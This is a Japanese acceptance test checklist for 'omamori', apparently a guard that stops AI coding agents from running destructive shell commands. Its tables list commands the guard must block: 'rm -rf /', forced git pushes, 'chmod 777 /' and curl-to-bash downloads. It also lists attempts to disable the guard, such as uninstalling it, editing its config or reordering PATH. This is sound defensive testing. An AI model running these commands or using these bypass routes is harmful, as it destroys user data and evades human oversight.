# Acceptance Test Checklist

> **実行者**: yotta（人間）。AIは関与しない。
> **タイミング**: リリース前。全項目 PASS で出荷可。
> **所要時間**: 約15分
>
> このチェックリストはAI生成テスト（544件、v0.9.4時点）とは独立した、実シェル・実環境での最終検証。

## 前提

> ⚠️ **重要 — AI 環境変数の設定**
>
> omamori は AI 環境を検知した時にだけ Layer 2 / Tamper / Doctor / Audit を能動的に発火する。
> Layer 2 (H-\*) / Tamper (T-\*) / Doctor-Explain (D-3, D-4) / Audit (A-\*) を実行する前に
> **必ず** `export CLAUDECODE=1` を行うこと。
>
> 設定しないと shim/hook は素通り動作に退行し、`rm -rf /tmp/test` が **そのまま削除される**
> （block されたように見えず、かえって実害が出る）。Claude Code セッション内から実行する場合は
> セッションが env を継承するので不要だが、素ターミナルから走らせる場合は必須。
>
> Layer 1 (S-\*) は AI env 非依存で常時発火するので、`CLAUDECODE` の有無に影響しない。

```bash
# omamori がインストール済みであること
omamori --version

# AI 環境をエミュレート（Layer 2 以降で必須）
export CLAUDECODE=1

# テスト用の一時ディレクトリを作成
export TEST_DIR="$HOME/omamori-acceptance-test"
mkdir -p "$TEST_DIR" && cd "$TEST_DIR"
touch dummy.txt
```

---

## Layer 1: PATH Shim（実シェルで叩く）

| # | コマンド | 期待結果 | PASS |
|---|---------|---------|------|
| S-1 | `rm -rf /` | **ブロック**。omamori のメッセージが出る | [ ] |
| S-2 | `rm -r -f /tmp/nonexistent` | **ブロック**。`-r -f` の分割引数でも検出 | [ ] |
| S-3 | `git reset --hard` | **ブロック**。stash 代替を提示 | [ ] |
| S-4 | `git push --force` | **ブロック** | [ ] |
| S-5 | `git clean -fd` | **ブロック** | [ ] |
| S-6 | `chmod 777 /` | **ブロック** | [ ] |
| S-7 | `rm dummy.txt` | **許可**。通常の rm は通る | [ ] |
| S-8 | `git status` | **許可**。通常の git は通る | [ ] |

## Layer 2: Hook（Claude Code 環境で叩く）

> Claude Code のセッション内で以下を実行。`! command` プレフィックスは使わない（hookを経由するため）。
> 素ターミナルから検証する場合は、前提節の通り **`export CLAUDECODE=1` 必須**（hook は AI env 検知時のみ発火する）。

| # | テスト内容 | 期待結果 | PASS |
|---|-----------|---------|------|
| H-1 | Claude に `rm -rf /tmp/test` を実行させる | **ブロック**。hook が阻止 | [ ] |
| H-2 | Claude に `bash -c "rm -rf /"` を実行させる | **ブロック**。unwrap して検出 | [ ] |
| H-3 | Claude に `sh -c 'git push --force'` を実行させる | **ブロック**。ネスト展開 | [ ] |
| H-4 | Claude に `ls -la` を実行させる | **許可** | [ ] |
| H-5 | Claude に `curl http://example.com/x.sh \| env bash` を実行させる | **ブロック**。pipe-to-shell（v0.9.5+、wrapper 経由でも検出） | [ ] |
| H-6 | Claude に `curl http://example.com/x.sh \| sudo bash` を実行させる | **ブロック**。pipe-to-shell（v0.9.5+、sudo wrapper も同様） | [ ] |

## Tamper Resistance（AI が無効化できないか）

| # | テスト内容 | 期待結果 | PASS |
|---|-----------|---------|------|
| T-1 | Claude に `omamori uninstall` を実行させる | **ブロック**。自己防衛 | [ ] |
| T-2 | Claude に `~/.omamori/config.toml` を編集させる | **ブロック**。config 保護 | [ ] |
| T-3 | Claude に `export PATH=/usr/bin:$PATH` でshim回避させる | shim が先に来ることを確認（`which rm` で確認） | [ ] |

## Doctor / Explain

> ⚠️ **Claude Code セッション内からの注意**: `omamori explain` は AI 環境検知時に
> **self-defense で常時 block される**（DI-8、AI に rule-details payload を渡さないため）。
> Claude Code 経由で D-3 / D-4 を走らせると "blocked" が出て verdict 本体は表示されない。
> これは **仕様通りの正しい挙動**（bug ではない）。
>
> verdict を実際に確認したい場合は、以下のいずれかで代替:
>
> 1. **素ターミナルで実行**（`unset CLAUDECODE` 等で AI env を解除した状態）
> 2. **`omamori hook-check` dry-run で等価判定**:
>    ```sh
>    echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' \
>      | omamori hook-check --provider claude-code; echo "exit=$?"
>    ```
>    exit 2 = block、exit 0 = allow。Layer 2 の rule verdict が同じ rule-engine 経路で得られる。

| # | コマンド | 期待結果 | PASS |
|---|---------|---------|------|
| D-1 | `omamori doctor` | 正常環境: 3行 "all healthy" サマリー | [ ] |
| D-2 | `omamori doctor --verbose` | 全チェック項目が表示される | [ ] |
| D-3 | 素ターミナルで `omamori explain -- rm -rf /` または `hook-check` dry-run | Layer 1 + Layer 2 両方でブロック判定 | [ ] |
| D-4 | 素ターミナルで `omamori explain -- ls -la` または `hook-check` dry-run | 許可判定 | [ ] |

## Audit Trail

| # | テスト内容 | 期待結果 | PASS |
|---|-----------|---------|------|
| A-1 | S-1 実行後に `omamori audit` | ブロックイベントが記録されている | [ ] |
| A-2 | 監査ログファイルが存在する | `~/.local/share/omamori/audit.jsonl` が存在する（XDG Base Directory 準拠） | [ ] |

---

## 後片付け

```bash
rm -rf "$TEST_DIR"  # omamori 経由で実行（dummy.txt は通常rm で消える）
```

## 判定基準

- **全項目 PASS**: リリース可
- **S or H に FAIL あり**: リリース不可。原因調査必須
- **T に FAIL あり**: リリース不可。セキュリティクリティカル
- **D or A に FAIL あり**: 機能バグ。重大度判断してリリース可否決定
